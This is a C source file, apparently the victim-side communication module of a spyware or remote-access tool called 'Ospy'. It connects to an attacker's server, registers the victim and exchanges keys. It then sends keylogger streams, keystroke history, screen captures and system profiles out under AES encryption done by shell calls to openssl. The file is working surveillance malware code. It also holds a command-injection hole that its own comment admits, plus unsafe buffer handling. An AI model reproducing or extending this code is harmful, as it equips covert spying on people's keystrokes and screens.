#include "connection.h"

STATUS create_connection(){
	struct sockaddr_in serverAddr;
	
	V_S_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	if(V_S_socket < 0)
		return FAILUR;
	
	memset(&serverAddr, '\0', sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(PORT);
	serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
	if(connect(V_S_socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
		return FAILUR;
	return SUCCESS;
}

void log_in_victim () {
	encrypted_general_message_protocol encrypted_message;
	encrypted_message.i_am = VICTIM;
	encrypted_message.action = LOG_IN;
	FILE * config_file = fopen("config","rb");
	
	fgets(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, MAX_USER_NAME_LEN, config_file);
	fgets(encrypted_message.data.encrypted_login_vicim_to_Ospy.id, HASH_LEN, config_file);
	
	strtok(encrypted_message.data.encrypted_login_vicim_to_Ospy.victim_name, "\n"); // remove the new line
	strtok(encrypted_message.data.encrypted_login_vicim_to_Ospy.id, "\n"); // remove the new line

	send(V_S_socket, &encrypted_message, sizeof(encrypted_message), 0);
	fclose(config_file);	
}

void secure_key_exchange(){ // send victim's public RSA key to the server, then the server can transfer to this victim his attacker aes key
	encrypted_general_message_protocol encrypted_message;
	encrypted_message.i_am = VICTIM;
	encrypted_message.action = KEY_EXCHANGE;
	FILE * public_key_file = fopen("public_key.pem", "r");
	FILE * encrepted_aes_key_fd;
	FILE * rsa_decryption_fd;
	char sub_buffer[65];
	char encrypted_aes_key_result[RSA_BASE64_AES_KEY_SIZE];
	char decrypt_rsa_cmd[90];
	char delete_temp_aes_key_cmd[5 + sizeof(TEMP_RCVE_AES_KEY_FILE_NAME)];
	
	memset(encrypted_message.data.key_exchange_buffer, '\0', sizeof(encrypted_message.data.key_exchange_buffer));
	memset(sub_buffer, '\0', sizeof(sub_buffer));
	
	while (fgets(sub_buffer, sizeof(sub_buffer), public_key_file) != NULL) // load the public_key.pem file to the buffer
		strcat(encrypted_message.data.key_exchange_buffer, sub_buffer);	
	send(V_S_socket, &encrypted_message, sizeof(encrypted_general_message_protocol), 0);
	fclose(public_key_file);
	
	recv(V_S_socket, &encrypted_aes_key_result, sizeof(encrypted_aes_key_result), 0);
	encrepted_aes_key_fd = fopen(TEMP_RCVE_AES_KEY_FILE_NAME, "w");
	fprintf(encrepted_aes_key_fd, "%s", encrypted_aes_key_result);
	fclose(encrepted_aes_key_fd);
	
	sprintf(decrypt_rsa_cmd, "openssl base64 -d -in %s | openssl rsautl -decrypt -inkey private_key.pem", TEMP_RCVE_AES_KEY_FILE_NAME);
	rsa_decryption_fd = popen(decrypt_rsa_cmd, "r");
	fgets(AES_KEY, sizeof(AES_KEY), rsa_decryption_fd);	
	pclose(rsa_decryption_fd);
	
	// delete "TEMP_RCVE_AES_KEY_FILE_NAME" file
	sprintf(delete_temp_aes_key_cmd, "rm %s", TEMP_RCVE_AES_KEY_FILE_NAME);
	system(delete_temp_aes_key_cmd);
}

// victim to server encrypted message handler, get main_data struct and encrypt it in aes 
void V_2_S_encrypted_message_handler(main_data data, action_type action){ // victim - server 
	encrypted_general_message_protocol encrypted_message;
	encrypted_message.i_am = VICTIM;
	encrypted_message.action = action;
	
	switch (action) {
		case GET_KEYSTROKES_STREAM :
			strcpy(encrypted_message.data.keylogger_stream_key, encrypt_text(data.keylogger_stream_key, AES_KEY));
			
			break;
		
		// all these options result in sending to the attacker a file. the encryption of the file is in the "send_file" function
		case GET_SYSTEM_PROFILER :
		case GET_KEYLOGGER_HISTORY :
		case GET_SCREEN_STREAM :
			strcpy(encrypted_message.data.file_data.file_sub_buffer, data.file_data.file_sub_buffer);
			strcpy(encrypted_message.data.file_data.checksum, data.file_data.checksum);
			encrypted_message.data.file_data.end_of_file = data.file_data.end_of_file;
			
			break;
					
		default :
			break;
	}
	send(V_S_socket, &encrypted_message, sizeof(encrypted_message), 0);
}

// send a file in plain text or in AES-256-CBC encrypted way
void send_file (char * file_name, action_type action, bool convert_to_base64_and_encrypt) {
	main_data data;
	char sub_buffer[MTU];
	FILE * encrypted_file_fd;
	char convert_file_to_buffer_commend[MAX_FILE_TO_BUFFER_COMMEND_LEN];
	
	char temp_checksum_full_buffer[MTU + HASH_LEN];
	char temp_checksum[HASH_LEN];
	strcpy(temp_checksum, "\0");
	memset(temp_checksum_full_buffer, '0', strlen(temp_checksum_full_buffer));
	data.file_data.end_of_file = 0;
	
	if (convert_to_base64_and_encrypt)
		sprintf(convert_file_to_buffer_commend, "openssl aes-256-cbc -base64 -in %s -k %s", file_name, AES_KEY); // there is injection variability, to be fix
	else 
		sprintf(convert_file_to_buffer_commend, "cat %s", file_name);
	
	encrypted_file_fd = popen(convert_file_to_buffer_commend, "r");
	
	while (fgets(sub_buffer, sizeof(sub_buffer), encrypted_file_fd) != NULL) {
		strcpy(temp_checksum_full_buffer, temp_checksum);
		strcat(temp_checksum_full_buffer, sub_buffer);
		strcpy(temp_checksum, md5(temp_checksum_full_buffer));
		strcpy(data.file_data.file_sub_buffer, sub_buffer);
		V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
	}
	data.file_data.end_of_file = 1;
	strcpy(data.file_data.checksum, temp_checksum);
	
	V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
	pclose(encrypted_file_fd);
}


// AES 256 cbc encryption
char * encrypt_text (char * text_to_encrypt, char * encrypt_key){
	int max_len = (strlen(text_to_encrypt) * 1.36) + 100;
	char * encrypted_text = (char *) malloc(max_len * sizeof(char));
	char sub_buffer[65];
	char encrypt_commend[40 + strlen(text_to_encrypt) + strlen(encrypt_key)];
	FILE * temp_aes_file = fopen(ENCRYPTED_RECEIVED_DATA_NAME, "w");
	fprintf(temp_aes_file, "%s", text_to_encrypt);
	fclose(temp_aes_file);
	sprintf(encrypt_commend, "openssl aes-256-cbc -base64 -in %s -k %s", ENCRYPTED_RECEIVED_DATA_NAME, encrypt_key); 
	
	FILE * aes_encryption_fd = popen(encrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_encryption_fd) != NULL) 
		strcat(encrypted_text, sub_buffer);
	
	pclose(aes_encryption_fd);
	return encrypted_text;
}
//AES 256 cbc decryption
char * decrypt_text (char * text_to_decrypt, char * decryption_key){
	char * decrypted_text = (char *) malloc(strlen(text_to_decrypt) * sizeof(char));
	char sub_buffer[65];
	char decrypt_commend[40 + strlen(text_to_decrypt) + strlen(decryption_key)];
	
	FILE * temp_aes_file = fopen(ENCRYPTED_RECEIVED_DATA_NAME, "w");
	fprintf(temp_aes_file, "%s", text_to_decrypt);
	fclose(temp_aes_file);
	sprintf(decrypt_commend, "openssl aes-256-cbc -d -in %s -base64 -k %s", ENCRYPTED_RECEIVED_DATA_NAME, decryption_key);
	
	FILE * aes_decryption_fd = popen(decrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_decryption_fd) != NULL) {
//		strtok(sub_buffer, "\n");
		strcat(decrypted_text, sub_buffer);
	}	
	pclose(aes_decryption_fd);
	return decrypted_text;
}

